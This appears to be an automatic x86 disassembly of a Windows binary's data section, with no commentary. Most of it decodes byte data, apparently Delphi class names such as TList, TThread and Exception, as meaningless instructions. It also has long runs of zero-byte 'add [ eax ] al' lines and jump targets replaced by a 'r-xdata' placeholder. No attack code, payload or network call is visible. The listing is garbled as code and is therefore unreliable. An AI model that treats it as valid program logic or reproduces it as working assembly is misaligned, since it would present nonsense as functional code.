add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les eax [ ecx + eax * 2 ]
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 2 + 0x41 ] ch
outsb
inc ebp
jb r-xdata
insd
inc ebp
jb r-xdata
add [ ecx + esi + 0x40 ] dl
add [ eax * 2 + 0x65727453 ] cl
popad
inc eax
add [ eax + 0x43 ] ah
inc ecx
add [ eax ] al
add [ eax ] al
sbb [ ecx ] dh
inc eax
sub al 0x46
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 2 ] ch
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ edx ] cl
inc ebp
dec esp
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
outsd
jb r-xdata
xor [ eax ] al
outsd
jne r-xdata
add [ eax + eax ] cl
add [ eax ] al
enter 0x4143 0x0
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or al [ ebp + 0x52 ]
popad
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
inc esp
inc ecx
outsd
jb r-xdata
add ah bh
xor [ eax ] al
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
add [ eax * 2 + 0xc0041 ] bl
add [ eax ] al
enter 0x4143 0x0
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
push cs
inc ebp
inc ebx
insb
popad
jae r-xdata
inc ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x45
nop
js r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
inc edx
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or eax [ ebp + 0x46 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 2 ] dl
inc esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x46
lea eax [ eax ]
aam 0x45
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x47 ] al
inc ecx
add [ eax ] dl
add [ eax ] al
add [ eax + esi * 2 ] bl
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add al bh
outsd
jb r-xdata
add [ ecx + esi + 0x40 ] dl
add [ eax * 2 + 0x4e736552 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x45 ] bh
dec ecx
shl [ eax + 0x48 ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x48 ] ah
inc ecx
add [ eax + eax ] ah
add [ eax ] al
call 0xffffffff94418851
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
sub [ ebp + 0x41 ] 0x0
or edx [ esp + edx * 2 + 0x68 ]
jb r-xdata
inc ecx
add [ eax ] dl
add [ eax ] al
add al ch
adc [ eax ] al
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
pushfd
imul eax [ ecx ] sub_416b40
sub [ ebp + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x48
jne r-xdata
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
or al [ ebp + 0x42 ]
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
test [ esi + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 2 + 0xc0041 ] al
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc [ ebp + 0x53 ] al
je r-xdata
inc eax
add ah ah
inc esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
inc esi
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
cmovne eax [ ebx + 0x6f ]
insd
jo r-xdata
add al dh
imul eax [ ecx ] sub_416a6c
add eax 0x73694c54
je r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x47fcc08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
dec ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
dec ecx
inc ecx
add [ esi ] ah
dec ecx
inc ecx
add [ eax + eax ] al
add [ eax ] al
call 0xffffffff944188fd
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
nop
jo r-xdata
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc004148
add [ eax ] al
add al ch
adc [ eax ] al
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 ] cl
outsb
jbe r-xdata
arpl [ ebp + 0x73 ] sp
pushfd
inc edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 + 0xc0041 ] bl
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc [ ebp + 0x49 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
mov ch 0x40
add [ ecx + esi + 0x40 ] dl
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
xor [ eax ] al
clc
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
jae r-xdata
jae r-xdata
add [ eax + esi * 2 + 0x20041 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
inc edi
inc ecx
add [ eax + eax ] cl
outsd
jb r-xdata
jb r-xdata
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
nop
jo r-xdata
add [ ebp - 0x7c33ffc0 ] cl
inc esp
and al 0x4
clc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
dec edx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
ror [ eax + 0x41 ] 0x0
xchg esp eax
xor eax [ eax ]
pushad
jb r-xdata
add [ edx + ecx * 2 ] cl
inc ecx
add [ eax ] bh
dec edx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
jae r-xdata
inc edi
inc ecx
add [ eax ] al
add [ eax ] al
sbb dl 0x7
inc ebx
insb
popad
jae r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
outsb
je r-xdata
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
add [ eax + 0x7d ] bl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0x38746e65
dec edx
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x4b ] bh
add [ eax ] al
add [ eax ] al
push 0x8800414b
dec ebx
inc ecx
add [ eax ] al
jb r-xdata
push eax
add [ eax + esi * 2 + 0x72f00041 ] bh
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx + 0x40 ] bl
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
sub al 0x7f
inc ecx
add ah dh
jae r-xdata
dec [ ebx + 0x414ae8c0 ]
add [ eax ] al
add bh bh
mov al [ 0xffffffffa0004029 ]
add al bl
jne r-xdata
add [ eax + 0x4b ] ch
inc ecx
add [ eax + 0x414b ] cl
jb r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jpe r-xdata
imul esi [ ebx + 0x74 ] 0xfc746e65
dec ecx
inc ecx
add [ ecx + ecx * 2 ] dh
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax + 0x3000414c ] dh
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ecx * 2 + 0x41 ] ah
push cs
add [ eax ] bl
je r-xdata
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
mov al [ 0x74004029 ]
ja r-xdata
add al dl
je r-xdata
jge r-xdata
inc ecx
add [ eax ] dl
add [ eax ] al
add al al
dec eax
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
mov al [ 0xffffffffa0004173 ]
jno r-xdata
inc eax
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax - 0x5fffbe8d ] ah
jae r-xdata
dec eax
add al dl
je r-xdata
jl r-xdata
mov [ ebx + 0x41 ] cl
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] eax
add [ eax ] al
dec edx
inc ecx
sub [ eax ] eax
add [ eax - 0x5fffbfd7 ] ah
fdiv [ ebp + 0x41 ]
outsb
dec ecx
je r-xdata
add [ eax + 0x7a ] dh
inc ecx
add [ ebx + edi * 2 + 0x41 ] al
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ eax + 0x78 ] ch
inc ecx
add ah ah
jns r-xdata
je r-xdata
add [ eax + 0x5c004029 ] ah
js r-xdata
js r-xdata
add [ ebp + edi * 2 + 0x7ef40041 ] cl
inc ecx
add [ edi + edi * 2 + 0x41 ] bh
add [ eax + r-xdata ] dl
add al 0x87
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
add [ esp + eax * 4 + 0x41 ] al
add [ eax + 0x7a ] dh
inc ecx
add [ ebx + edi * 2 + 0x41 ] al
add [ eax - 0x6fffbe7c ] al
test [ ecx ] al
mov ah 0x82
inc ecx
add [ eax + 0x78 ] ch
inc ecx
add [ ebx + eax * 4 - 0x7c1fffbf ] ch
inc ecx
add ah ah
add [ ecx ] 0xffffffe8
add [ ecx ] 0xffffffbc
js r-xdata
add [ ecx + ecx * 2 ] dh
add [ eax + eax * 4 ] bh
inc ecx
add ah al
add [ ecx ] 0xd0
jae r-xdata
inc ecx
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
add al 0x81
inc ecx
add [ eax - 0x27ffbe8f ] ah
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
outsb
jne r-xdata
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov esp 0x4010
add [ eax ] al
add [ ebp + 0x4c180040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
dec esp
inc ecx
add [ eax ] al
jae r-xdata
add [ eax - 0x3ffbe85 ] ch
jpo r-xdata
in al 0x79
inc ecx
add [ eax + 0x64004029 ] ah
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
sbb [ ecx + eax * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ ecx + eax * 2 ] 0x0
inc ecx
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
imul ebp [ esi + 0x67 ] 0x7473694c
ror [ ecx + eax * 2 ] 0x7
or edx [ ebx + edx * 2 + 0x74 ]
dec esp
imul esi [ ebx + 0x74 ] r-xdata
test [ ebx + 0x41 ] cl
add [ eax ] al
add [ edi ] al
add [ eax + 0x4000417c ] ch
jle r-xdata
test al 0x7b
inc ecx
add ah bh
jpo r-xdata
add [ ecx + eax * 2 + 0x41849000 ] 0x0
add [ ebp + eax * 4 + 0x41 ] bl
add [ eax - 0x73ffbe7b ] bh
xchg [ ecx ] al
jl r-xdata
add [ ecx ] sub_4171a0
jae r-xdata
push esp
push ebx
je r-xdata
dec edx
inc ecx
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
add [ eax + 0x4000417c ] ch
jle r-xdata
inc esp
jpo r-xdata
inc ecx
add [ eax + edi * 2 + 0x7d580041 ] bh
push ebx
je r-xdata
popad
mov [ edi - 0x7827ffbf ] es
inc ecx
add al dh
xchg [ ecx ] eax
mov al [ 0xffffffffa0004029 ]
sub [ eax ] eax
nop
mov [ ecx ] al
adc al 0x89
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
outsb
jb r-xdata
jae r-xdata
inc ebx
insb
popad
jae r-xdata
add [ ebx + ecx * 2 + 0x41 ] al
pop es
add [ eax + 0x2c00417e ] bl
jg r-xdata
jb r-xdata
inc ecx
add al cl
xchg [ ecx ] al
cmp al 0x87
inc ecx
add [ eax - 0x7f ] ah
inc ecx
add [ ecx + eax * 4 + 0x41 ] ch
add [ eax ] bl
je r-xdata
add [ ebx + 0x414bacc0 ] cl
add [ eax ] al
add [ edx + ecx * 2 + 0x33940041 ] bl
inc eax
add [ eax - 0x5bffbfcd ] ah
add [ edi ] al
imul ebp [ esi + 0x67 ] 0x4b889073
inc ecx
jae r-xdata
add [ eax + 0x2c00417e ] bl
jg r-xdata
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
pop es
add [ eax + 0x78004029 ] ah
jpo r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
sbb [ esi + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 ] dh
inc ecx
add [ eax ] cl
add [ eax ] al
add [ ebp + ecx * 2 + 0x41 ] dl
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
movsb [ edi ] [ esi ]
lea eax [ ecx ]
mov [ edi - 0x742fffbf ] es
inc ecx
add ah ah
mov eax [ ecx ]
test [ ebx - 0x746bffbf ] cl
inc ecx
add [ eax - 0x5bffbe78 ] dl
mov eax [ ecx ]
or edx [ esi + eax * 2 + 0x69 ]
insb
insb
add [ ebx + ecx * 4 + 0x540d0041 ] ah
dec eax
popad
outsb
insd
mov al [ 0x414d ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0x80041 ] bh
add [ eax ] al
in al 0x4c
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
mov [ edi - 0x742fffbf ] es
inc ecx
add ah ah
mov eax [ ecx ]
test [ ebx - 0x746bffbf ] cl
inc ecx
add [ eax - 0x5bffbe78 ] dl
mov eax [ ecx ]
or eax 0x6e614854
popad
add [ ebp + 0x4d300040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0x41 ] cl
add [ eax + eax ] al
add [ eax ] al
call 0xffffffff94418d21
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add al dl
add [ ecx ] sub_4181ec
in al 0x84
inc ecx
add [ ebx + eax * 4 ] dh
inc ecx
add ah dh
xchg [ ecx ] al
in al dx
add [ ecx ] sub_4184e4
xor al 0x83
add [ ecx ] 0xb4
add [ ecx ] 0x68
js r-xdata
add [ eax ] cl
add [ ecx ] 0x48
add [ esi ] cl
lodsb [ esi ]
dec ebx
inc ecx
add [ esi ] cl
insd
dec ebp
insd
outsd
jb r-xdata
popad
jns r-xdata
push ebx
je r-xdata
insd
mov [ esi + 0x41 ] cs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000414e ] ch
add [ eax ] al
add ah ah
dec esp
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
mov [ edi - 0x7827ffbf ] es
inc ecx
add al dh
xchg [ ecx ] eax
loopne r-xdata
add [ ebx + ecx * 4 - 0x776fffbf ] dl
inc ecx
add [ ebx + ecx * 4 + 0x540b0041 ] ah
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
inc ecx
add [ eax + 0x18004029 ] ah
mov es [ ecx ]
adc al 0x89
mov [ edi - 0x7827ffbf ] es
je r-xdata
insd
popad
insd
or [ edi + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
dec edi
inc ecx
add [ eax + eax ] dl
add [ eax ] al
inc eax
dec esi
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
cmp al 0x8e
inc ecx
add [ edi + eax * 4 - 0x711fffbf ] cl
inc ecx
add al dh
xchg [ ecx ] eax
loopne r-xdata
outsd
jb r-xdata
adc al 0x89
je r-xdata
inc ecx
add [ edi + ecx * 4 ] cl
inc ecx
add [ 0x6d654d54 ] cl
add [ ecx + ecx * 4 ] dl
inc ecx
add [ ecx + edx * 4 + 0x41 ] dl
add [ eax ] bl
mov es [ ecx ]
adc al 0x89
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
outsd
inc ecx
add al dh
xchg [ ecx ] eax
loopne r-xdata
popad
insd
mov eax eax
test [ edi + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1800414f ] ah
add [ eax ] al
add [ eax + 0x4e ] al
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
sbb al 0x91
inc ecx
add [ edi + eax * 4 - 0x7827ffbf ] cl
push ebx
push ebx
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
add [ ecx + ecx * 4 ] dl
inc ecx
add [ eax + 0x1800418f ] bl
mov es [ ecx ]
inc ecx
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_4150c8
mov [ 0x4150 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 ] bh
inc ecx
add [ eax ] bl
add [ eax ] al
add [ edx + edx ] cl
inc eax
add [ ebx + esi + 0x57dc0040 ] dl
inc eax
add al ch
push edi
inc eax
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
clc
push edi
inc eax
add [ eax ] bl
xor [ eax ] eax
clc
iretd
sub_415150
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
push ecx
inc ecx
add [ eax ] cl
add [ eax ] al
add al ch
adc [ eax ] al
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
hlt
sub_415195
pushad
inc ecx
add [ esp + edx * 2 ] cl
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6bffbeaf ] ch
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
je r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add ah dh
push ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 ] al
inc ecx
add [ eax ] ch
add [ eax ] al
add al ch
adc [ eax ] al
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
mov ah 0x91
inc ecx
add ah bl
xchg ecx eax
inc ecx
add [ eax - 0x5fffbfd7 ] ah
sub [ eax ] eax
mov al [ 0x6004029 ]
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x41525890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4152 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7c004152 ] dl
add [ eax ] al
inc eax
add [ ecx + edx * 4 - 0x6e23ffbf ] dh
inc ecx
add ah bl
xchg ecx eax
inc ecx
add ah dl
cwde
inc ecx
add [ eax ] cl
cdq
inc ecx
add [ esp + ebx * 4 ] bl
inc ecx
add al bh
cdq
inc ecx
add [ ebx + edi * 4 ] ah
inc ecx
add [ eax ] bl
0xbbf40041 0x41
fdivr [ ebx - 0x56a7ffbf ]
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] bh
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg edx eax
push edx
inc ecx
add [ eax + eax ] bh
shr al 0x52
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push edx
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
outsd
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
pop es
inc ebp
push esp
push 0x64616572
hlt
sub_4152f1
push edx
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
